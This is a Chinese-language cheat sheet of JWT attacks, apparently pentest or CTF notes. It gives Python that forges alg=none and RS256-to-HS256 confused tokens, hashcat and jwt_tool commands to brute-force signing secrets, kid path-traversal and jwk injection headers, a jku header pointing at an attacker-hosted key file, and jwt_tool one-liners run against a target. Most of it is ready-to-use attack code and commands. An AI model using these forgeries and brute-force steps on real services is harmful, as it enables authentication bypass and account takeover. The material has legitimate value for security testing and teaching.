# JWT 攻击

## 结构

`header.payload.signature`，每段 base64url。

```bash
echo '<jwt>' | cut -d. -f1 | base64 -d 2>/dev/null    # header
echo '<jwt>' | cut -d. -f2 | base64 -d 2>/dev/null    # payload
```

或 `jwt-cli` / [jwt.io](#)（仅本地用）。

## 攻击决策

1. 看 header.alg
2. `none` → 直接伪造
3. `HS256/HS384/HS512` → 弱密钥爆破
4. `RS256/RS512` → RS-HS 混淆 / kid 注入 / jku/jwk 注入

## alg=none 攻击

```python
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(b'{"user":"admin"}').rstrip(b'=')
print(f"{header.decode()}.{payload.decode()}.")
```

## HS256 爆破

```bash
# hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# jwt_tool
jwt_tool <jwt> -C -d /usr/share/wordlists/rockyou.txt
```

## RS-HS 混淆

服务端用 `verify(public_key, jwt)`，没显式校验 alg：
1. 拿到公钥 `pubkey.pem`
2. 用 HS256 算 `HMAC(pubkey.pem, header+payload)`
3. 替换 alg 为 HS256，签名用上面的 HMAC

```python
import jwt, json
from cryptography.hazmat.primitives import serialization

with open('pubkey.pem','rb') as f:
    public = f.read()
new_jwt = jwt.encode({"user":"admin"}, public, algorithm="HS256")
print(new_jwt)
```

## kid 注入（路径穿越）

```json
{"alg":"HS256","kid":"../../../../tmp/x","typ":"JWT"}
```
让服务端把 `/tmp/x` 当 key 读。结合 LFI 写文件。

## jwk 注入

```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"<n>","e":"AQAB"},"typ":"JWT"}
```
服务端从 header 直接取 jwk → 用攻击者私钥签名。

## jku 注入

```json
{"alg":"RS256","jku":"https://attacker/x.json","typ":"JWT"}
```
服务端从 jku 拉公钥 → 对应私钥可用。需要外网或 SSRF。

## 实战常用

```bash
# 一键尝试所有
jwt_tool <jwt> -M at -t http://target -rh "Authorization: Bearer <jwt>"

# 篡改 payload
jwt_tool <jwt> -T

# 测 alg=none
jwt_tool <jwt> -X a

# 暴破
jwt_tool <jwt> -C -d /usr/share/wordlists/jwt.secrets.list

# RS→HS
jwt_tool <jwt> -X k -pk pubkey.pem
```

## 常见误用

- 服务端只验签不验过期：`exp` 任改
- 用户字段在 header 而非 payload：注意改对位置
- `iat` `nbf` 可控但服务端只看 `exp`
- token 在 cookie / Authorization / 自定义 header / GET 参数 多个位置传 → 都试
